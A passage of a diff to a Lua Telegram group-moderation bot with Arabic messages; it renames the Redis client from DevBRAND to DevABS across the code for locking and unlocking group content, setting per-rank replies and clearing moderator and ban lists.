-if DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الانكليزيه")  
-DevBRAND:del(BRAND..'BRAND:Lock:English'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:English'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الانكليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الاشعارات" then
-if DevBRAND:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الاشعارات")  
-DevBRAND:del(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الملصقات" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الملصقات")  
-DevBRAND:del(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "التوجيه" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التوجيه")  
-DevBRAND:del(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
 end
@@ -8093,10 +8093,10 @@ if text and text:match("^قفل التفليش$") or text and text:match("^تف�
 if not Constructor(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
 else
-DevBRAND:set(BRAND.."BRAND:Lock:Bots"..msg.chat_id_,"del") DevBRAND:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
+DevABS:set(BRAND.."BRAND:Lock:Bots"..msg.chat_id_,"del") DevABS:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
 LockList ={'BRAND:Lock:Links','BRAND:Lock:Contact','BRAND:Lock:Forwards','BRAND:Lock:Videos','BRAND:Lock:Gifs','BRAND:Lock:EditMsgs','BRAND:Lock:Stickers','BRAND:Lock:Farsi','BRAND:Lock:Spam','BRAND:Lock:WebLinks','BRAND:Lock:Photo'}
 for i,Lock in pairs(LockList) do
-DevBRAND:set(BRAND..Lock..msg.chat_id_,true)
+DevABS:set(BRAND..Lock..msg.chat_id_,true)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التفليش")  
 end
@@ -8105,10 +8105,10 @@ if text and text:match("^فتح التفليش$") then
 if not Constructor(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
 else
-DevBRAND:hdel(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
+DevABS:hdel(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
 UnLockList ={'BRAND:Lock:Links','BRAND:Lock:Contact','BRAND:Lock:Forwards','BRAND:Lock:Videos','BRAND:Lock:Gifs','BRAND:Lock:EditMsgs','BRAND:Lock:Stickers','BRAND:Lock:Farsi','BRAND:Lock:Spam','BRAND:Lock:WebLinks','BRAND:Lock:Photo'}
 for i,UnLock in pairs(UnLockList) do
-DevBRAND:del(BRAND..UnLock..msg.chat_id_)
+DevABS:del(BRAND..UnLock..msg.chat_id_)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التفليش")  
 end
@@ -8118,11 +8118,11 @@ if text and text:match("^قفل الكل$") then
 if not Constructor(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
 else
-DevBRAND:del(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_) DevBRAND:del(BRAND..'BRAND:Lock:Taf'..msg.chat_id_) DevBRAND:del(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_) 
-DevBRAND:set(BRAND.."BRAND:Lock:Bots"..msg.chat_id_,"del") DevBRAND:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
+DevABS:del(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_) DevABS:del(BRAND..'BRAND:Lock:Taf'..msg.chat_id_) DevABS:del(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_) 
+DevABS:set(BRAND.."BRAND:Lock:Bots"..msg.chat_id_,"del") DevABS:hset(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
 LockList ={'BRAND:Lock:EditMsgs','BRAND:Lock:Farsi','BRAND:Lock:TagServr','BRAND:Lock:Inline','BRAND:Lock:Photo','BRAND:Lock:Spam','BRAND:Lock:Videos','BRAND:Lock:Gifs','BRAND:Lock:Music','BRAND:Lock:Voice','BRAND:Lock:Links','BRAND:Lock:Location','BRAND:Lock:Tags','BRAND:Lock:Stickers','BRAND:Lock:Markdown','BRAND:Lock:Forwards','BRAND:Lock:Document','BRAND:Lock:Contact','BRAND:Lock:Hashtak','BRAND:Lock:WebLinks'}
 for i,Lock in pairs(LockList) do
-DevBRAND:set(BRAND..Lock..msg.chat_id_,true)
+DevABS:set(BRAND..Lock..msg.chat_id_,true)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل جميع الاوامر")  
 end
@@ -8131,10 +8131,10 @@ if text and text:match("^فتح الكل$") then
 if not Constructor(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئين فقط', 1, 'md')
 else
-DevBRAND:set(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_,true) DevBRAND:set(BRAND..'BRAND:Lock:Taf'..msg.chat_id_,true) DevBRAND:set(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_,true) DevBRAND:hdel(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
+DevABS:set(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_,true) DevABS:set(BRAND..'BRAND:Lock:Taf'..msg.chat_id_,true) DevABS:set(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_,true) DevABS:hdel(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
 UnLockList ={'BRAND:Lock:EditMsgs','BRAND:Lock:Text','BRAND:Lock:Arabic','BRAND:Lock:English','BRAND:Lock:Join','BRAND:Lock:Bots','BRAND:Lock:Farsi','BRAND:Lock:FarsiBan','BRAND:Lock:TagServr','BRAND:Lock:Inline','BRAND:Lock:Photo','BRAND:Lock:Spam','BRAND:Lock:Videos','BRAND:Lock:Gifs','BRAND:Lock:Music','BRAND:Lock:Voice','BRAND:Lock:Links','BRAND:Lock:Location','BRAND:Lock:Tags','BRAND:Lock:Stickers','BRAND:Lock:Markdown','BRAND:Lock:Forwards','BRAND:Lock:Document','BRAND:Lock:Contact','BRAND:Lock:Hashtak','BRAND:Lock:WebLinks'}
 for i,UnLock in pairs(UnLockList) do
-DevBRAND:del(BRAND..UnLock..msg.chat_id_)
+DevABS:del(BRAND..UnLock..msg.chat_id_)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح جميع الاوامر")  
 end
@@ -8146,7 +8146,7 @@ local SetSpam = text:match("ضع سبام (%d+)$") or text:match("وضع سبا�
 if tonumber(SetSpam) < 40 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙اختر عدد اكبر من 40 حرف ', 1, 'md')
 else
-DevBRAND:set(BRAND..'BRAND:Spam:Text'..msg.chat_id_,SetSpam)
+DevABS:set(BRAND..'BRAND:Spam:Text'..msg.chat_id_,SetSpam)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد السبام ↫'..SetSpam, 1, 'md')
 end
 end
@@ -8167,54 +8167,54 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙صلاحيات البوت هي ↫ �
 end end
 if text and text:match("^تغير رد المطور (.*)$") then
 local Text = text:match("^تغير رد المطور (.*)$") 
-DevBRAND:set(BRAND.."BRAND:SudoBot:Rd"..msg.chat_id_,Text)
+DevABS:set(BRAND.."BRAND:SudoBot:Rd"..msg.chat_id_,Text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المطور الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
 local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
-DevBRAND:set(BRAND.."BRAND:BasicConstructor:Rd"..msg.chat_id_,Text)
+DevABS:set(BRAND.."BRAND:BasicConstructor:Rd"..msg.chat_id_,Text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنشئ الاساسي الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد المنشئ (.*)$") then
 local Text = text:match("^تغير رد المنشئ (.*)$") 
-DevBRAND:set(BRAND.."BRAND:Constructor:Rd"..msg.chat_id_,Text)
+DevABS:set(BRAND.."BRAND:Constructor:Rd"..msg.chat_id_,Text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنشئ الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد المدير (.*)$") then
 local Text = text:match("^تغير رد المدير (.*)$") 
-DevBRAND:set(BRAND.."BRAND:Managers:Rd"..msg.chat_id_,Text) 
+DevABS:set(BRAND.."BRAND:Managers:Rd"..msg.chat_id_,Text) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المدير الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد الادمن (.*)$") then
 local Text = text:match("^تغير رد الادمن (.*)$") 
-DevBRAND:set(BRAND.."BRAND:Admins:Rd"..msg.chat_id_,Text)
+DevABS:set(BRAND.."BRAND:Admins:Rd"..msg.chat_id_,Text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد الادمن الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد المميز (.*)$") then
 local Text = text:match("^تغير رد المميز (.*)$") 
-DevBRAND:set(BRAND.."BRAND:VipMem:Rd"..msg.chat_id_,Text)
+DevABS:set(BRAND.."BRAND:VipMem:Rd"..msg.chat_id_,Text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المميز الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد المنظف (.*)$") then
 local Text = text:match("^تغير رد المنظف (.*)$") 
-DevBRAND:set(BRAND.."BRAND:Cleaner:Rd"..msg.chat_id_,Text)
+DevABS:set(BRAND.."BRAND:Cleaner:Rd"..msg.chat_id_,Text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنظف الى ↫ "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد العضو (.*)$") then
 local Text = text:match("^تغير رد العضو (.*)$") 
-DevBRAND:set(BRAND.."BRAND:mem:Rd"..msg.chat_id_,Text)
+DevABS:set(BRAND.."BRAND:mem:Rd"..msg.chat_id_,Text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد العضو الى ↫ "..Text, 1, 'md')
 end
 if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف جميع ردود الرتب", 1, 'md')
-DevBRAND:del(BRAND.."BRAND:mem:Rd"..msg.chat_id_)
-DevBRAND:del(BRAND.."BRAND:Cleaner:Rd"..msg.chat_id_)
-DevBRAND:del(BRAND.."BRAND:VipMem:Rd"..msg.chat_id_)
-DevBRAND:del(BRAND.."BRAND:Admins:Rd"..msg.chat_id_)
-DevBRAND:del(BRAND.."BRAND:Managers:Rd"..msg.chat_id_)
-DevBRAND:del(BRAND.."BRAND:Constructor:Rd"..msg.chat_id_)
-DevBRAND:del(BRAND.."BRAND:BasicConstructor:Rd"..msg.chat_id_)
-DevBRAND:del(BRAND.."BRAND:SudoBot:Rd"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:mem:Rd"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Cleaner:Rd"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:VipMem:Rd"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Admins:Rd"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Managers:Rd"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Constructor:Rd"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:BasicConstructor:Rd"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:SudoBot:Rd"..msg.chat_id_)
 end
 end
 --     Source BRAND     --
@@ -8277,41 +8277,41 @@ local txts = {string.match(text, "^(حذف) (.*)$")}
 local txtss = {string.match(text, "^(مسح) (.*)$")}
 if Sudo(msg) then 
 if txts[2] == 'الثانويين' or txtss[2] == 'الثانويين' or txts[2] == 'المطورين الثانويين' or txtss[2] == 'المطورين الثانويين' then
-DevBRAND:del(BRAND..'BRAND:SecondSudo:')
+DevABS:del(BRAND..'BRAND:SecondSudo:')
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المطورين الثانويين")  
 end
 end
 if SecondSudo(msg) then 
 if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
-DevBRAND:del(BRAND..'BRAND:SudoBot:')
+DevABS:del(BRAND..'BRAND:SudoBot:')
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المطورين")  
 end
 if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
-DevBRAND:del(BRAND..'BRAND:BanAll:')
-DevBRAND:del(BRAND..'BRAND:MuteAll:')
+DevABS:del(BRAND..'BRAND:BanAll:')
+DevABS:del(BRAND..'BRAND:MuteAll:')
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة العام")  
 end
 end
 if SudoBot(msg) then
 if txts[2] == 'الادمنيه العامين' or txts[2] == 'الادمنيه العام' or txtss[2] == 'الادمنيه العامين' or txtss[2] == 'الادمنيه العام' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الادمنيه العامين")  
-DevBRAND:del(BRAND..'BRAND:AdminAll:')
+DevABS:del(BRAND..'BRAND:AdminAll:')
 end
 if txts[2] == 'المميزين عام' or txts[2] == 'المميزين العامين' or txtss[2] == 'المميزين عام' or txtss[2] == 'المميزين العامين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المميزين عام")  
-DevBRAND:del(BRAND..'BRAND:VipAll:')
+DevABS:del(BRAND..'BRAND:VipAll:')
 end
 if txts[2] == 'المدراء العامين' or txts[2] == 'المدراء العام' or txtss[2] == 'المدراء العامين' or txtss[2] == 'المدراء العام' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المدراء العامين")  
-DevBRAND:del(BRAND..'BRAND:ManagerAll:')
+DevABS:del(BRAND..'BRAND:ManagerAll:')
 end
 if txts[2] == 'المالكين' or txtss[2] == 'المالكين' then
-DevBRAND:del(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_)
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,dp) 
 local admins = dp.members_
 for i=0 , #admins do
 if dp.members_[i].status_.ID == "ChatMemberStatusCreator" then
-DevBRAND:sadd(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevABS:sadd(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,admins[i].user_id_)
 end 
 end  
 end,nil)
@@ -8321,78 +8321,78 @@ end
 if BRANDConstructor(msg) then
 if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المنشئين الاساسيين")  
-DevBRAND:del(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_)
 end
 end
 if BasicConstructor(msg) then
 if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المنشئين")  
-DevBRAND:del(BRAND..'BRAND:Constructor:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Constructor:'..msg.chat_id_)
 end end
 if Constructor(msg) then
 if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المدراء")  
-DevBRAND:del(BRAND..'BRAND:Managers:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Managers:'..msg.chat_id_)
 end 
 if txts[2] == 'المنظفين' or txtss[2] == 'المنظفين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المنظفين")  
-DevBRAND:del(BRAND..'BRAND:Cleaner:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Cleaner:'..msg.chat_id_)
 end end
 if Manager(msg) then
 if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الادمنيه")  
-DevBRAND:del(BRAND..'BRAND:Admins:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Admins:'..msg.chat_id_)
 end
 end
 if txts[2] == 'قوانين' or txtss[2] == 'قوانين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف القوانين")  
-DevBRAND:del(BRAND..'BRAND:rules'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:rules'..msg.chat_id_)
 end
 if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المطايه")  
-DevBRAND:del(BRAND..'User:Donky:'..msg.chat_id_)
+DevABS:del(BRAND..'User:Donky:'..msg.chat_id_)
 end
 if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف رابط المجموعه")  
-DevBRAND:del(BRAND.."BRAND:Groups:Links"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Groups:Links"..msg.chat_id_)
 end
 if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المميزين")  
-DevBRAND:del(BRAND..'BRAND:VipMem:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:VipMem:'..msg.chat_id_)
 end
 if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
-DevBRAND:del(BRAND..'BRAND:Muted:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Muted:'..msg.chat_id_)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المكتومين")  
 end
 if txts[2] == 'المقيدين' or txtss[2] == 'المقيدين' then     
-local List = DevBRAND:smembers(BRAND..'BRAND:Tkeed:'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:Tkeed:'..msg.chat_id_)
 for k,v in pairs(List) do   
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
-DevBRAND:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_, v)
+DevABS:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_, v)
 end 
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المقيدين")  
 end
 if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة المنع")  
-DevBRAND:del(BRAND..'BRAND:Filters:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Filters:'..msg.chat_id_)
 end
 if txts[2] == 'قوائم المنع' or txtss[2] == 'قوائم المنع' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قوائم المنع")  
-DevBRAND:del(BRAND..'BRAND:Filters:'..msg.chat_id_)
-DevBRAND:del(BRAND.."BRAND:FilterAnimation"..msg.chat_id_)
-DevBRAND:del(BRAND.."BRAND:FilterPhoto"..msg.chat_id_)
-DevBRAND:del(BRAND.."BRAND:FilterSteckr"..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Filters:'..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:FilterAnimation"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:FilterPhoto"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:FilterSteckr"..msg.chat_id_)
 end
 if txts[2] == 'قائمه منع المتحركات' or txtss[2] == 'قائمه منع المتحركات' then     
-DevBRAND:del(BRAND.."BRAND:FilterAnimation"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:FilterAnimation"..msg.chat_id_)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة منع المتحركات")  
 end
 if txts[2] == 'قائمه منع الصور' or txtss[2] == 'قائمه منع الصور' then     
-DevBRAND:del(BRAND.."BRAND:FilterPhoto"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:FilterPhoto"..msg.chat_id_)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة منع الصور")  
 end
 if txts[2] == 'قائمه منع الملصقات' or txtss[2] == 'قائمه منع الملصقات' then     
-DevBRAND:del(BRAND.."BRAND:FilterSteckr"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:FilterSteckr"..msg.chat_id_)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف قائمة منع الملصقات")  
 end
 end
@@ -8402,7 +8402,7 @@ if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and t
 if not BasicConstructor(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئ الاساسي فقط', 1, 'md')
 else
-DevBRAND:del(BRAND..'BRAND:Ban:'..msg.chat_id_) DevBRAND:del(BRAND..'BRAND:Admins:'..msg.chat_id_) DevBRAND:del(BRAND..'User:Donky:'..msg.chat_id_) DevBRAND:del(BRAND..'BRAND:VipMem:'..msg.chat_id_) DevBRAND:del(BRAND..'BRAND:Filters:'..msg.chat_id_) DevBRAND:del(BRAND..'BRAND:Muted:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Ban:'..msg.chat_id_) DevABS:del(BRAND..'BRAND:Admins:'..msg.chat_id_) DevABS:del(BRAND..'User:Donky:'..msg.chat_id_) DevABS:del(BRAND..'BRAND:VipMem:'..msg.chat_id_) DevABS:del(BRAND..'BRAND:Filters:'..msg.chat_id_) DevABS:del(BRAND..'BRAND:Muted:'..msg.chat_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
 end end
 --     Source BRAND     --
@@ -8410,12 +8410,12 @@ if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text 
 if not BRANDConstructor(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمالكين فقط', 1, 'md')
 else
-local basicconstructor = DevBRAND:smembers(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_)
-local constructor = DevBRAND:smembers(BRAND..'BRAND:Constructor:'..msg.chat_id_)
-local Managers = DevBRAND:smembers(BRAND..'BRAND:Managers:'..msg.chat_id_)
-local admins = DevBRAND:smembers(BRAND..'BRAND:Admins:'..msg.chat_id_)
-local vipmem = DevBRAND:smembers(BRAND..'BRAND:VipMem:'..msg.chat_id_)
-local donky = DevBRAND:smembers(BRAND..'User:Donky:'..msg.chat_id_)
+local basicconstructor = DevABS:smembers(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_)
+local constructor = DevABS:smembers(BRAND..'BRAND:Constructor:'..msg.chat_id_)
+local Managers = DevABS:smembers(BRAND..'BRAND:Managers:'..msg.chat_id_)
+local admins = DevABS:smembers(BRAND..'BRAND:Admins:'..msg.chat_id_)
+local vipmem = DevABS:smembers(BRAND..'BRAND:VipMem:'..msg.chat_id_)
+local donky = DevABS:smembers(BRAND..'User:Donky:'..msg.chat_id_)
 if #basicconstructor ~= 0 then basicconstructort = 'المنشئين الاساسيين • ' else basicconstructort = '' end
 if #constructor ~= 0 then constructort = 'المنشئين • ' else constructort = '' end
 if #Managers ~= 0 then Managerst = 'المدراء • ' else Managerst = '' end
@@ -8423,12 +8423,12 @@ if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
 if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
 if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
 if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
-DevBRAND:del(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Constructor:'..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Managers:'..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Admins:'..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:VipMem:'..msg.chat_id_)
-DevBRAND:del(BRAND..'User:Donky:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Constructor:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Managers:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Admins:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:VipMem:'..msg.chat_id_)
+DevABS:del(BRAND..'User:Donky:'..msg.chat_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف جميع الرتب التاليه ↫ ❨ "..basicconstructort..constructort..Managerst..adminst..vipmemt..donkyt.." ❩ بنجاح \n ✓", 1, 'md')
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد رتب هنا", 1, 'md')
@@ -8438,64 +8438,64 @@ end
 --     Source BRAND     --
 if Admin(msg) then 
 if text and text:match("^الاعدادات$") and ChCheck(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Spam:Text'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Spam:Text'..msg.chat_id_) then
 spam_c = 400
 else
-spam_c = DevBRAND:get(BRAND..'BRAND:Spam:Text'..msg.chat_id_)
+spam_c = DevABS:get(BRAND..'BRAND:Spam:Text'..msg.chat_id_)
 end
 --     Source BRAND     --
-if DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
+if DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
 flood = "بالطرد"     
-elseif DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
+elseif DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
 flood = "بالتقيد"     
-elseif DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
+elseif DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
 flood = "بالكتم"           
-elseif DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
+elseif DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
 flood = "بالحذف"
 else     
 flood = "مفتوح"     
 end
 --     Source BRAND     --
-if DevBRAND:get(BRAND.."BRAND:Lock:Bots"..msg.chat_id_) == "del" then
+if DevABS:get(BRAND.."BRAND:Lock:Bots"..msg.chat_id_) == "del" then
 lock_bots = "بالحذف"
-elseif DevBRAND:get(BRAND.."BRAND:Lock:Bots"..msg.chat_id_) == "ked" then
+elseif DevABS:get(BRAND.."BRAND:Lock:Bots"..msg.chat_id_) == "ked" then
 lock_bots = "بالتقيد"   
